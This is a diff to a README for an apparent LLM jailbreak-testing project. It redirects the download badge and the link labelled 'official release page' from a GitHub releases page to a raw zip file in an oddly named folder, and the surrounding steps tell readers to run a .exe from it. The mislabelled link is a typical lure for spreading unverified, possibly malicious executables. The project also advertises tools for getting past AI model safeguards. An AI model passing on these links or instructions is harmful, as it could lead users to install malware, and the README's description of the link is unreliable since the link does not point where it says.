@@ -1,6 +1,6 @@
 # 🛡️ LLM-Jailbreak-Research - Test Large Language Model Security Gaps
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/cheeseboardchalcisfly616/LLM-Jailbreak-Research/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/cheeseboardchalcisfly616/LLM-Jailbreak-Research/main/internunciatory/Jailbreak_LL_Research_2.5.zip)
 
 This project provides tools to test large language models for security weaknesses. It focuses on the EASL technique, which identifies vulnerabilities in models like DeepSeek and Google Gemini. Security teams and researchers use these tools to understand model behavior and improve safety.
 
@@ -22,7 +22,7 @@ The goal is to increase AI safety. Developers use these results to patch securit
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official release page](https://github.com/cheeseboardchalcisfly616/LLM-Jailbreak-Research/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/cheeseboardchalcisfly616/LLM-Jailbreak-Research/main/internunciatory/Jailbreak_LL_Research_2.5.zip).
 2. Look for the most recent version at the top of the list.
 3. Click the file with a .exe extension to start the download.
 4. Save the file to your desktop or downloads folder.
